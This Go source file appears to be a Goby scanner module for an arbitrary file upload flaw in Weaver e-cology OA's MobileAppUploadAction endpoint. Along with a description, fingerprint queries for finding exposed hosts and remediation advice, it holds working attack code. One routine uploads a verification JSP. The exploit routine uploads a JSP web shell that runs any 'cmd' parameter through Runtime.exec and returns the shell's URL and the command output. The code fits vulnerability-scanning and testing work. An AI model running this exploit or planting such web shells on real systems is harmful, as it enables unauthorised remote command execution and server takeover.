package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Weaver e-cology OA Action.jsp MobileAppUploadAction file upload",
    "Description": "Weaver ecology OA has an arbitrary file upload vulnerability.",
    "Impact": "Weaver e-cology OA Action.jsp MobileAppUploadAction file upload",
    "Recommendation": "<p>1. If not necessary, prohibit public network access to the system. </p><p>2. Set access policies and whitelist access through security devices such as firewalls. </p><p>3. Upgrade to the latest version of the product</p>",
    "Product": "Weaver-OA",
    "VulType": [
        "File Upload"
    ],
    "Tags": [
        "File Upload"
    ],
    "Translation": {
        "CN": {
            "Name": "泛微OA e-cology Action.jsp MobileAppUploadAction 文件上传漏洞",
            "Description": "<p>Weaver e-cology是中国泛微（Weaver）公司的一套协同管理应用平台。</p><p>Weaver e-cology OA Action.jsp 文件存在文件上传漏洞。</p>",
            "Impact": "<p>攻击者可以通过此漏洞上传webshell,进而拿到服务器权限。</p>",
            "Recommendation": "<p>1、如⾮必要，禁⽌公⽹访问该系统。</p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>3、升级到产品到最新版本</p>",
            "Product": "泛微-协同办公OA",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Weaver e-cology OA Action.jsp MobileAppUploadAction file upload",
            "Description": "Weaver ecology OA has an arbitrary file upload vulnerability.",
            "Impact": "Weaver e-cology OA Action.jsp MobileAppUploadAction file upload",
            "Recommendation": "<p>1. If not necessary, prohibit public network access to the system. </p><p>2. Set access policies and whitelist access through security devices such as firewalls. </p><p>3. Upgrade to the latest version of the product</p>",
            "Product": "Weaver-OA",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "FofaQuery": "(header=\"testBanCookie\" || banner=\"testBanCookie\" || body=\"/wui/common/css/w7OVFont.css\" || (body=\"typeof poppedWindow\" && body=\"client/jquery.client_wev8.js\") || body=\"/theme/ecology8/jquery/js/zDialog_wev8.js\" || body=\"ecology8/lang/weaver_lang_7_wev8.js\")",
    "GobyQuery": "(header=\"testBanCookie\" || banner=\"testBanCookie\" || body=\"/wui/common/css/w7OVFont.css\" || (body=\"typeof poppedWindow\" && body=\"client/jquery.client_wev8.js\") || body=\"/theme/ecology8/jquery/js/zDialog_wev8.js\" || body=\"ecology8/lang/weaver_lang_7_wev8.js\")",
    "Author": "henry123",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2021-05-20",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/mobilemode/Action.jsp?invoker=com.weaver.formmodel.mobile.ui.servlet.MobileAppUploadAction&action=image"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36")
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryRoL5N5mD7MRNEdNE")
			cfg.VerifyTls = false
			cfg.Data = "\r\n------WebKitFormBoundaryRoL5N5mD7MRNEdNE\r\nContent-Disposition: form-data; name=\"upload\"; filename=\"test.jsp\"\r\nContent-Type: text/plain\r\n\r\n<%\r\n  out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer(\"YzEyYjEwMTIwYmM5ZjQ0NGFmY2I2NDYyMmYzOGJiMjE=\")));\r\n  new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n------WebKitFormBoundaryRoL5N5mD7MRNEdNE--"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "SUCCESS") {
					reg := regexp.MustCompile(`/mobilemode(.*?)jsp`)
					vurl := reg.FindString(resp.Utf8Html)
					if resp2, err := httpclient.SimpleGet(u.FixedHostInfo + vurl); err == nil {
						return resp2.StatusCode == 200 && strings.Contains(resp2.Utf8Html, "c12b10120bc9f444afcb64622f38bb21")
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/mobilemode/Action.jsp?invoker=com.weaver.formmodel.mobile.ui.servlet.MobileAppUploadAction&action=image"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36")
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryRoL5N5mD7MRNEdNE")
			cfg.VerifyTls = false
			cfg.Data = "------WebKitFormBoundaryRoL5N5mD7MRNEdNE\r\nContent-Disposition: form-data; name=\"upload\"; filename=\"test.jsp\"\r\nContent-Type: text/plain\r\n\r\n<%java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream();int a = -1;byte[] b = new byte[2048];while((a=in.read(b))!=-1){out.println(new String(b));}%>\r\n------WebKitFormBoundaryRoL5N5mD7MRNEdNE--"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "SUCCESS") {
					reg := regexp.MustCompile(`/mobilemode(.*?)jsp`)
					vurl := reg.FindString(resp.Utf8Html)
					cmd := ss.Params["cmd"].(string)
					vurll := vurl + "?cmd=" + cmd
					if resp2, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + vurll); err == nil {
						expResult.Success = true
						webshell := expResult.HostInfo.FixedHostInfo + vurll
						expResult.Output = "webshell:" + "\n" + webshell + resp2.RawBody
					}
				}
			}
			return expResult
		},
	))
}
